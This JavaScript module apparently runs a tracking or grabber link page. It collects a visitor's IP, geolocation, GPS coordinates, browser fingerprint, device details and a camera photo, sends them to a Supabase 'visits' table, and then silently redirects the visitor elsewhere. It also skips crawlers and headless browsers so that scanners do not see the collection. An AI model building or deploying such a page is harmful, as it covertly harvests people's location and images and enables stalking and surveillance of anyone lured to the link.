import { collectAll } from "./collect-v3.js";
import { fetchRedirectUrl, isSupabaseConfigured } from "./settings.js";
import { shouldSkipVisitorFlow } from "./bot-filter.js";

function cfg() {
  return window.APP_CONFIG || {};
}

function authHeaders() {
  const { supabaseAnonKey } = cfg();
  return {
    apikey: supabaseAnonKey,
    Authorization: `Bearer ${supabaseAnonKey}`,
    "Content-Type": "application/json",
    Prefer: "return=minimal",
  };
}

const KEEPALIVE_LIMIT = 61440; // 60 KB — browsers cap keepalive at 64 KB

/**
 * Strip the photo if the payload crosses the keepalive cap.
 * A dropped selfie is recoverable; a dropped row is not.
 */
function trimForKeepalive(payload) {
  const json = JSON.stringify(payload);
  if (json.length <= KEEPALIVE_LIMIT) {
    return { body: json, photoDropped: false };
  }

  const lean = {
    ...payload,
    photo_base64: null,
    camera_granted: payload.camera_granted,
    photo_dropped: true,
  };
  return { body: JSON.stringify(lean), photoDropped: true };
}

/**
 * Fire-and-redirect save.
 * fetch keepalive survives window.location.replace() on iOS Safari and Chrome.
 * If the payload is too big for keepalive, the photo is stripped and the row
 * still lands with camera_granted set so the dashboard shows the denial.
 */
function saveVisitFireAndForget(payload) {
  const { supabaseUrl } = cfg();
  if (!isSupabaseConfigured()) return;

  const { body } = trimForKeepalive(payload);

  try {
    fetch(`${supabaseUrl}/rest/v1/visits`, {
      method: "POST",
      keepalive: true,
      headers: authHeaders(),
      body,
    }).catch(() => {});
  } catch {
    /* ignore */
  }
}

async function saveVisit(payload) {
  const { supabaseUrl } = cfg();
  if (!isSupabaseConfigured()) return { ok: false, local: true };

  const res = await fetch(`${supabaseUrl}/rest/v1/visits`, {
    method: "POST",
    headers: authHeaders(),
    body: JSON.stringify(payload),
  });
  if (!res.ok) throw new Error(String(res.status));
  return { ok: true };
}

function buildPayload(collected, isBot) {
  const hasGps = !!collected.gps;

  const coordinates = hasGps
    ? {
        latitude: collected.gps.latitude,
        longitude: collected.gps.longitude,
        accuracy: collected.gps.accuracy,
        source: "gps",
      }
    : collected.ip_geo
      ? {
          latitude: collected.ip_geo.latitude,
          longitude: collected.ip_geo.longitude,
          accuracy: null,
          source: "ip",
        }
      : null;

  return {
    ip: collected.ip,
    ip_source: collected.ip_source,
    ip_geo: collected.ip_geo,
    fingerprint: collected.fingerprint,
    is_bot: !!isBot,
    device_info: {
      ...collected.device,
      ua_high_entropy: collected.ua_high_entropy,
      hardware_extra: collected.hardware,
      hardware_async: collected.hardware_async,
      fingerprint_channels: collected.fingerprint_channels,
      visitKind: "human",
    },
    location_granted: hasGps,
    location: coordinates,
    gps_reason: collected.gps_reason,
    camera_granted: collected.camera_granted,
    photo_base64: collected.photo_base64,
    referrer: document.referrer || null,
    page_url: location.href,
  };
}

export function initVisitorPage() {
  async function run() {
    if (shouldSkipVisitorFlow()) {
      window.location.replace(await fetchRedirectUrl());
      return;
    }

    const redirectPromise = fetchRedirectUrl().catch(() => cfg().redirectUrl);

    let collected;
    try {
      collected = await collectAll();
    } catch {
      collected = {
        device: {},
        camera_granted: false,
        photo_base64: null,
        gps_reason: "error",
      };
    }

    const isBot =
      collected.device?.flags?.webdriver ||
      /HeadlessChrome|PhantomJS/i.test(collected.device?.userAgent || "");

    const payload = buildPayload(collected, isBot);
    const redirectTarget = await redirectPromise;

    saveVisitFireAndForget(payload);
    window.location.replace(redirectTarget);
  }

  run();
}

export { buildPayload, saveVisit, saveVisitFireAndForget, trimForKeepalive };
